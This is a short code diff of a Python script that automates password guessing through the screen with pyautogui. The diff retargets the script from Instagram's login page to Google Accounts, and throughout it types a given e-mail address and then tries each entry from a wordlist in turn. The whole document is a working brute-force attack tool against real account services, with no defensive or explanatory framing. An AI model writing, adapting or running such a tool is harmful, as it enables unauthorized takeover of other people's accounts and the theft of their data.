@@ -2,15 +2,15 @@
 import time
 import pyautogui
 
-url = "https://www.instagram.com/"
-user = input("\nUser: ")
+url = "https://accounts.google.com/"
+user = input("\nE-mail: ")
 
 wordlist = open('wordlist.txt', 'r').readlines()
-pyautogui.click(x=1207,y=411)
+pyautogui.click(x=891,y=526)
 time.sleep(1)
 pyautogui.write(user)   
 time.sleep(1)
-pyautogui.press('TAB')
+pyautogui.press('enter')
 for senha in wordlist:
     time.sleep(1)
     pyautogui.write(senha)
@@ -19,6 +19,3 @@ for senha in wordlist:
     pyautogui.press('enter')
     time.sleep(3)
     # requisiçao para pegar parametros na tela caso faça login
-    pyautogui.hotkey('ctrl', 'a')
-    pyautogui.press('backspace')
-    time.sleep(3)
